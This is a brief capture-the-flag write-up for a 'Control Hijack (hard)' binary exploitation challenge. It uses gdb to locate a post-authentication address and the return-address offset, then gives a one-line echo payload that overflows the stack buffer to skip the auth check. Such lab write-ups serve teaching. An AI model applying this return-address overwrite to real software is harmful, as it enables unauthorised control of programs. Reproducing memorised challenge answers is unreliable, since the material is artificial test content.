# Control Hijack (hard)

1. In gdb, `disas win_authed` and `disas main`, we get to know:
    - Instruction after auth check is at **0x00000000004021de**
    - challenge() returns at **0x0000000000402441**

2. Set a breakpoint `b *challenge+148`, run and give a short string of a's as input
3. `info frame` -> rbp is at **0x7ffd1df81e00**
4. `x/100xg $rbp-200`:
    - input buffer starts at **0x7ffd1df81db0**, which is **rbp-0x50** = rbp-80
    - return address is stored at **0x7ffd1df81e08**, which is **rbp+0x8** = rbp+8
5. 88 a's followed by desired address:

    ```shell
    echo -n -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xde\x21\x40\x00\x00\x00\x00\x00" | /challenge/binary-exploitation-control-hijack-2 
    ```
